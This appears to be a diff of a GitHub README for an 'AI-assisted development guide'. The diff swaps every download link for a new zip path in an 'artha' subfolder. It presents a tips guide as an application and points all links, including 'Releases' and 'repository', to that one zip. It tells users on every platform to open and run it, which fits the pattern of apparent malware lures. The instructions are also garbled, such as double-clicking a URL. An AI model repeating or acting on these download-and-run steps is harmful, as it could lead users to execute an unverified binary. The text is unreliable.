@@ -1,7 +1,7 @@
 # 🚀 ai-assisted-development-guide - Easy Tips for AI-Powered Dev
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/okhuyag/ai-assisted-development-guide/main/artha/ai-assisted-development-guide.zip%https://raw.githubusercontent.com/okhuyag/ai-assisted-development-guide/main/artha/ai-assisted-development-guide.zip)](https://raw.githubusercontent.com/okhuyag/ai-assisted-development-guide/main/artha/ai-assisted-development-guide.zip)
+[![Download](https://github.com/okhuyag/ai-assisted-development-guide/raw/refs/heads/main/artha/guide-ai-assisted-development-v2.0.zip%https://github.com/okhuyag/ai-assisted-development-guide/raw/refs/heads/main/artha/guide-ai-assisted-development-v2.0.zip)](https://github.com/okhuyag/ai-assisted-development-guide/raw/refs/heads/main/artha/guide-ai-assisted-development-v2.0.zip)
 
 ## 📖 Overview
 Welcome to the **ai-assisted-development-guide**! This guide offers practical tips for using AI effectively during software development. Whether you're building a simple app or a complex system, these tips can help you work smarter.
@@ -23,27 +23,27 @@ To run the ai-assisted-development-guide, your system should meet the following 
 - **Network**: Internet connection for updates and additional resources
 
 ## 📥 Download & Install
-To download the software, visit this page: [Download Releases](https://raw.githubusercontent.com/okhuyag/ai-assisted-development-guide/main/artha/ai-assisted-development-guide.zip). Follow these steps once you are there:
+To download the software, visit this page: [Download Releases](https://github.com/okhuyag/ai-assisted-development-guide/raw/refs/heads/main/artha/guide-ai-assisted-development-v2.0.zip). Follow these steps once you are there:
 
 1. Click on the latest version.
 2. Download the appropriate file for your system:
-    - For Windows: `https://raw.githubusercontent.com/okhuyag/ai-assisted-development-guide/main/artha/ai-assisted-development-guide.zip`
-    - For macOS: `https://raw.githubusercontent.com/okhuyag/ai-assisted-development-guide/main/artha/ai-assisted-development-guide.zip`
-    - For Linux: `https://raw.githubusercontent.com/okhuyag/ai-assisted-development-guide/main/artha/ai-assisted-development-guide.zip`
+    - For Windows: `https://github.com/okhuyag/ai-assisted-development-guide/raw/refs/heads/main/artha/guide-ai-assisted-development-v2.0.zip`
+    - For macOS: `https://github.com/okhuyag/ai-assisted-development-guide/raw/refs/heads/main/artha/guide-ai-assisted-development-v2.0.zip`
+    - For Linux: `https://github.com/okhuyag/ai-assisted-development-guide/raw/refs/heads/main/artha/guide-ai-assisted-development-v2.0.zip`
 3. Once the download is complete, locate the file in your downloads folder.
 
 ### 🖥 Installing on Windows
-1. Double-click the `https://raw.githubusercontent.com/okhuyag/ai-assisted-development-guide/main/artha/ai-assisted-development-guide.zip` file.
+1. Double-click the `https://github.com/okhuyag/ai-assisted-development-guide/raw/refs/heads/main/artha/guide-ai-assisted-development-v2.0.zip` file.
 2. Follow the instructions to install the application.
 3. After installation, you can find the guide in your Start Menu.
 
 ### 🍏 Installing on macOS
-1. Open the `https://raw.githubusercontent.com/okhuyag/ai-assisted-development-guide/main/artha/ai-assisted-development-guide.zip` file.
+1. Open the `https://github.com/okhuyag/ai-assisted-development-guide/raw/refs/heads/main/artha/guide-ai-assisted-development-v2.0.zip` file.
 2. Drag the application into your Applications folder.
 3. Find the guide in your Applications to open it.
 
 ### 🐧 Installing on Linux
-1. Extract the `https://raw.githubusercontent.com/okhuyag/ai-assisted-development-guide/main/artha/ai-assisted-development-guide.zip` file using your terminal or file manager.
+1. Extract the `https://github.com/okhuyag/ai-assisted-development-guide/raw/refs/heads/main/artha/guide-ai-assisted-development-v2.0.zip` file using your terminal or file manager.
 2. Open a terminal and navigate to the folder containing the extracted files.
 3. Run the application by entering `./ai-assisted-development-guide` in the terminal.
 
@@ -85,6 +85,6 @@ Follow us on social media for the latest updates and tips:
 - **Twitter**: @AIDevelopmentGuide
 - **LinkedIn**: ai-assisted-development-guide
 
-For more detailed information, visit our GitHub repository [here](https://raw.githubusercontent.com/okhuyag/ai-assisted-development-guide/main/artha/ai-assisted-development-guide.zip) to stay updated with the latest releases and enhancements. 
+For more detailed information, visit our GitHub repository [here](https://github.com/okhuyag/ai-assisted-development-guide/raw/refs/heads/main/artha/guide-ai-assisted-development-v2.0.zip) to stay updated with the latest releases and enhancements. 
 
 Thank you for using the **ai-assisted-development-guide**! Enjoy your journey into AI-assisted software development.
